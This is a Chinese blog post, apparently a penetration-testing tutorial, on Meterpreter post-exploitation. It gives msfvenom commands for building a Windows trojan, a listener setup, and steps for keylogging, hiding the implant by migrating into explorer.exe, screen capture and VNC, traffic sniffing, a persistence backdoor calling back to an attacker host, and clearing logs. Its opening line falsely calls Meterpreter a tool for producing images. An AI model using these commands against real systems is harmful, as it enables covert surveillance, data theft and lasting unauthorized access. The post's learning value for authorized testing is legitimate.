---
layout:     post
title:      Meterpreter-基础命令
subtitle:
date:       2020-5-9
author:     BY Diego
header-img: /img/wenzhang/post-bg-Meterpreter.jpg
catalog: true
tags:
    - 工具
    - 渗透
---

# 一、基础

Meterpreter是个用来产生各种图像的命令。适用于广大图形爱好者。

![YejJ4s.png](https://s1.ax1x.com/2020/05/07/YejJ4s.png)


help 命令查看帮助
![YmeEyF.png](https://s1.ax1x.com/2020/05/07/YmeEyF.png)

核心命令如下

命令 | 含义
-|-
banner |  显示一个metasploit横幅
cd |  更改当前的工作目录
color |  切换颜色
connect |  连接与主机通信
exit  | 退出控制台
get  | 获取特定于上下文的变量的值
getg |  获取全局变量的值
grep | grep另一个命令的输出
help  | 帮助菜单
history |   显示命令历史
irb  | 进入irb脚本模式
load  | 加载一个框架插件
quit  | 退出控制台
route  | 通过会话路由流量
save |  保存活动的数据存储
sessions  |  转储会话列表并显示有关会话的信息
set |  将特定于上下文的变量设置为一个值
setg |  将全局变量设置为一个值
sleep |  在指定的秒数内不做任何事情
spool  | 将控制台输出写入文件以及屏幕
threads |  线程查看和操作后台线程
unload |  卸载框架插件
unset |  取消设置一个或多个特定于上下文的变量
unsetg |  取消设置一个或多个全局变量
version |  显示框架和控制台库版本号

在控制台内是可以直接执行命令的
[![YmmoCt.png](https://s1.ax1x.com/2020/05/07/YmmoCt.png)](https://imgchr.com/i/YmmoCt)

## Meterpreter中常用的反弹类型
**1.reverse_tcp**
这是一个基于TCP的反向链接反弹shell, 使用起来很稳定

**2.reverse_http**
基于http方式的反向连接，在网速慢的情况下不稳定。

**3.reverse_https**
基于https方式的反向连接，在网速慢的情况下不稳定， https如果反弹没有收到数据，可以将监听端口换成443试试

**4.bind_tcp**
这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。
# 二、常见用法

## (1) windows

### ① msfvenom 生成木马
**查找payload**
```bash
msfvenom -l  payload | grep window
```
**生成木马**(正向连接型)
```bash
msfvenom -p windows/x64/meterpreter/bind_tcp  lport=60005 -f exe -o test.exe
```
**配置Meterpreter**
```bash
use multi/handler
```
![YmtcFK.png](https://s1.ax1x.com/2020/05/07/YmtcFK.png)
![YmtgJO.png](https://s1.ax1x.com/2020/05/07/YmtgJO.png)

**会话管理**
background #把meterpreter后台挂起
bglist #提供所有正在运行的后台脚本的列表
sessions #
session -i number # 与第number个交互
session -k number # kill 第number
![YnTpPP.png](https://s1.ax1x.com/2020/05/08/YnTpPP.png)

**文件上传**
[![YmaNJf.png](https://s1.ax1x.com/2020/05/07/YmaNJf.png)](https://imgchr.com/i/YmaNJf)
[![YmaUW8.png](https://s1.ax1x.com/2020/05/07/YmaUW8.png)](https://imgchr.com/i/YmaUW8)

**执行命令**
"execute"命令为目标主机上执行一个命令，其中"execute -h"显示帮助信息。-f为执行要运行的命令, -H后台执行 -i交互 -d 在目标主机执行时显示的进程名称（用以伪装）-m 直接从内存中执行
 "-o wce.txt"是wce.exe的运行参数
![YmdGX4.png](https://s1.ax1x.com/2020/05/07/YmdGX4.png)

**文件查找**
![Ymd8cF.png](https://s1.ax1x.com/2020/05/07/Ymd8cF.png)

**修改文件** edit filename
**查看文件** cat filename
**目录** cd / dir

**端口转发**
当服务在内网，无法直接访问可以端口转发到本机
这里将目标的 80 转发到了 8888
```shell
portfwd add  -l 8888 -p 80 -r 192.168.1.107
```
![Yn5sZn.png](https://s1.ax1x.com/2020/05/08/Yn5sZn.png)
![Yn5yaq.png](https://s1.ax1x.com/2020/05/08/Yn5yaq.png)

**键盘监控**
keyscan_start # 开始捕获
keyscan_dump  # 打印
keyscan_stop  # 停止
![Ynb98x.png](https://s1.ax1x.com/2020/05/08/Ynb98x.png)

**进程迁移**
防止木马挂掉，可以将进程迁移到其他合法进程上如explorer.exe是Windows程序管理器或者文件资源管理器
1. ps |grep explorer.exe 通过ps找到进程PID
2. migrate  **
![YuDjoQ.png](https://s1.ax1x.com/2020/05/08/YuDjoQ.png)


**屏幕捕获**
use espia
screengrab 捕获
![Yu85PU.png](https://s1.ax1x.com/2020/05/08/Yu85PU.png)

**屏幕监控**
```shell
enumdesktops  #查看可用的桌面
getdesktop    #获取当前meterpreter 关联的桌面
setdesktop   #设置meterpreter关联的桌面  -h查看帮助
screenshot  #截屏
use espia  #或者使用espia模块截屏  然后输入screengrab
run vnc  #使用vnc远程桌面连接
```
![YQZWHU.png](https://s1.ax1x.com/2020/05/09/YQZWHU.png)

**流量监控**
```shell
use sniffer
sniffer_interfaces   #查看网卡
sniffer_start 2   #选择网卡 开始抓包
sniffer_stats 2   #查看状态
sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包
sniffer_stop 2   #停止抓包
```
![YQEgGn.png](https://s1.ax1x.com/2020/05/09/YQEgGn.png)

**持久后门**
```bash
run persistence -X -i 5 -p 7777 -r 192.168.1.100
# -i 5 每五秒发送包 -p kali 接收端口 -r kail主机
reboot
exit

set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 7777
exploit
```
![YKW2DA.png](https://s1.ax1x.com/2020/05/08/YKW2DA.png)

**日志清除**
clearav


**待更新**
# 参考

[Metasploit 使用MSFconsole接口](https://www.fujieace.com/metasploit/msfconsole.html)

[后渗透之meterpreter使用攻略](https://xz.aliyun.com/t/2536#toc-9)

[]()

[]()
